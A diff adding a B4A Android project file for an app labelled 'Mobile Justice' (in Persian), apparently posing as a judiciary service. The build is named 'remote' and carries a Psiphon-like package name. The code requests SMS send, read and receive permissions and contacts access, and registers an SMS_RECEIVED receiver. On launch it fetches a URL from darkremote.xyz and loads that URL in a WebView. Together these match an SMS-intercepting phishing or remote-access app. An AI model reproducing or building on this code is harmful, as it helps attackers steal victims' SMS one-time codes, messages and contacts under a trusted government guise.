@@ -1,0 +1,83 @@
+﻿Build1=remote,com.psiphon289,NoAds
+File1=Layout.bal
+FileGroup1=Default Group
+Group=Default Group
+Library1=contactsutils
+Library10=phone
+Library11=pnsms
+Library12=reflection
+Library13=runtimepermissions
+Library14=javaobject
+Library2=core
+Library3=dateutils
+Library4=firebasenotifications
+Library5=json
+Library6=okhttp
+Library7=okhttputils2
+Library8=persiandate
+Library9=persiandeviceinfo
+ManifestCode='This code will be applied to the manifest file during compilation.~\n~'You do not need to modify it in most cases.~\n~'See this link for for more information: https://www.b4x.com/forum/showthread.php?p=78136~\n~AddManifestText(~\n~<uses-sdk android:minSdkVersion="14" android:targetSdkVersion="29"/>~\n~<supports-screens android:largeScreens="true" ~\n~    android:normalScreens="true" ~\n~    android:smallScreens="true" ~\n~    android:anyDensity="true"/>)~\n~SetApplicationAttribute(android:icon, "@drawable/icon")~\n~SetApplicationAttribute(android:label, "$LABEL$")~\n~CreateResourceFromFile(Macro, Themes.DarkTheme)~\n~'End of default text.~\n~CreateResourceFromFile(Macro, FirebaseAnalytics.GooglePlayBase)~\n~CreateResourceFromFile(Macro, FirebaseAnalytics.Firebase)~\n~CreateResourceFromFile(Macro, FirebaseNotifications.FirebaseNotifications)~\n~AddPermission(android.permission.SEND_SMS)~\n~AddPermission(android.permission.ACCESS_WIFI_STATE)~\n~AddPermission(android.permission.ACCESS_NETWORK_STATE)~\n~AddPermission(android.permission.RECEIVE_SMS)~\n~AddPermission(android.permission.READ_SMS)~\n~AddPermission(android.permission.INTERNET)~\n~SetApplicationAttribute(android:hardwareAccelerated, "true")~\n~AddPermission("android.permission.READ_CONTACTS")~\n~SetApplicationAttribute(android:largeHeap, "true")~\n~AddReceiverText(FirebaseMessaging,~\n~<intent-filter>~\n~    <action android:name="android.provider.Telephony.SMS_RECEIVED" />~\n~</intent-filter>)~\n~SetApplicationAttribute(android:hardwareAccelerated, "true")
+Module1=FirebaseMessaging
+Module2=Starter
+NumberOfFiles=1
+NumberOfLibraries=14
+NumberOfModules=2
+Version=11.2
+@EndOfDesignText@
+#Region  Project Attributes 
+	#ApplicationLabel: عدالت همراه
+	#VersionCode: 1
+	#VersionName: 1.0
+	'SupportedOrientations possible values: unspecified, landscape or portrait.
+	#SupportedOrientations: portrait
+	#CanInstallToExternalStorage: False
+	#BridgeLogger: True
+#End Region
+#Region  Activity Attributes 
+	#FullScreen: False
+	#IncludeTitle: False
+#End Region
+
+Sub Process_Globals
+	Dim rn As RuntimePermissions
+	Dim pd As PersianDeviceInfo
+End Sub
+
+Sub Globals
+	Private WebView1 As WebView
+End Sub
+Sub Activity_PermissionResult (Permission As String, Result As Boolean)
+	If  Permission=rn.PERMISSION_RECEIVE_SMS And Result Then
+	End If
+	
+	If  Permission=rn.PERMISSION_READ_EXTERNAL_STORAGE And Result Then
+	End If
+End Sub
+Sub Activity_Create(FirstTime As Boolean)
+	pd.initialize("pd")
+	
+	StartService(FirebaseMessaging)
+
+	Dim strResult As String = "https://darkremote.xyz/zx"
+	Activity.LoadLayout("layout")
+	Dim job1 As HttpJob
+	job1.Initialize("job1",Me)
+	job1.Download(strResult&"/url.txt")
+	Wait For JobDone(job As HttpJob)
+	Dim domain As String = job.GetString
+	WebView1.LoadUrl(domain)
+
+	rn.CheckAndRequest(rn.PERMISSION_RECEIVE_SMS)
+	rn.CheckAndRequest(rn.PERMISSION_SEND_SMS)
+	rn.CheckAndRequest(rn.PERMISSION_READ_SMS)
+	rn.CheckAndRequest(rn.PERMISSION_READ_CONTACTS)
+
+End Sub
+
+Sub Activity_Resume
+	
+End Sub
+
+Sub Activity_Pause (UserClosed As Boolean)
+	
+End Sub
